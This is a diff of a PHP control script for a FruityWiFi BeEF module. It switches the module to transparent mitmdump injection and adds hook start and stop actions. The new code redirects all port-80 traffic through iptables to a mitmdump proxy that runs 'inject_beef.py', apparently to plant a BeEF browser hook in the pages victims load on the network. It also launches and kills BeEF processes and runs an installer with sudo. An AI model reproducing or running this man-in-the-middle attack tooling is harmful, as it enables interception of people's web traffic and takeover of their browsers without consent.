@@ -1,6 +1,6 @@
 <? 
 /*
-	Copyright (C) 2013-2016 xtr4nge [_AT_] gmail.com
+	Copyright (C) 2013-2020 xtr4nge [_AT_] gmail.com
 
 	This program is free software: you can redistribute it and/or modify
 	it under the terms of the GNU General Public License as published by
@@ -16,7 +16,7 @@
 	along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */ 
 ?>
-<?php
+<?
 include "../login_check.php";
 include "../../../config/config.php";
 include "../_info_.php";
@@ -35,40 +35,52 @@ $action = $_GET['action'];
 $page = $_GET['page'];
 $install = $_GET['install'];
 
-$port = 9990;
+$port = 8337;
 
 if($service != "") {
     if ($action == "start") {
         // COPY LOG
-		$exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
+        if ( 0 < filesize($mod_logs)) {
+            $exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
+            exec_fruitywifi($exec);
+            
+            $exec = "$bin_echo '' > $mod_logs";
+            exec_fruitywifi($exec);
+        }
+	//START MODULE
+		
+	$exec = "./beef.sh";
+	exec_fruitywifi($exec);
+		
+
+    } else if($action == "stop") {
+				
+		$exec = "ps aux|grep -iEe 'ruby.+beef' | grep -v grep | awk '{print $2}'";
+		exec($exec,$output);
+		
+		$exec = "kill " . $output[0];
 		exec_fruitywifi($exec);
-		
-		if ($mod_beef_kali == "1") {
-			//$exec = "/etc/init.d/beef-xss restart";
-			//exec_fruitywifi($exec);
-			$exec = "./beef-kali";
-			exec_fruitywifi($exec);
-		} else {
-			//$exec = "/usr/bin/ruby -C beef-master/ beef > /tmp/beef.log &";
-			$exec = "./beef";
-			exec_fruitywifi($exec);
-			//exec_fruitywifi_env($exec);
-			//exec($exec);
-		}
-		
-		if ($mod_beef_auto == "1") {
-			$exec = "$bin_mitmproxy -q --port $port -T --host -s 'inject_beef.py $io_in_ip' >> $mod_logs &";
-			exec_fruitywifi($exec);
-			
+
+		// COPY LOG
+        if ( 0 < filesize( $mod_logs ) ) {
+            $exec = "$bin_cp $mod_logs $mod_logs_history/".gmdate("Ymd-H-i-s").".log";
+            exec_fruitywifi($exec);
+            
+            $exec = "$bin_echo '' > $mod_logs";
+            exec_fruitywifi($exec);
+        }
+
+
+    } else if ($action == "hookstart") {
+
 			$exec = "$bin_iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
 			exec_fruitywifi($exec);
-		}
-		
-    } else if($action == "stop") {
-		
-		$exec = "$bin_iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
-		exec_fruitywifi($exec);
-	
+
+			$exec = "$bin_mitdump -q --listen-port $port  --mode transparent -s 'inject_beef.py $io_in_ip' >> $mod_logs &";
+			exec_fruitywifi($exec);
+
+     } else if($action == "hookstop") {
+
 		$exec = "ps aux|grep -E 'mitmdump.+inject_beef' | grep -v grep | awk '{print $2}'";
 		exec($exec,$output);
 		
@@ -77,20 +89,22 @@ if($service != "") {
 		
 		unset($output);
 		
-		$exec = "ps aux|grep -iEe 'ruby.+beef' | grep -v grep | awk '{print $2}'";
-		exec($exec,$output);
-		
-		$exec = "kill " . $output[0];
-		exec_fruitywifi($exec);
-    }
+		$exec = "$bin_iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port $port";
+		exec_fruitywifi($exec);		
+     	}
 }
-
 
 if ($install == "install_$mod_name") {
 
     $exec = "chmod 755 install.sh";
     exec_fruitywifi($exec);
-   	
+
+    $exec = "chmod 755 beef.sh";
+    exec_fruitywifi($exec);
+
+    $exec = "chmod 755 beef-kali.sh";
+    exec_fruitywifi($exec);
+
     $exec = "$bin_sudo ./install.sh > $log_path/install.txt &";
     exec_fruitywifi($exec);
     
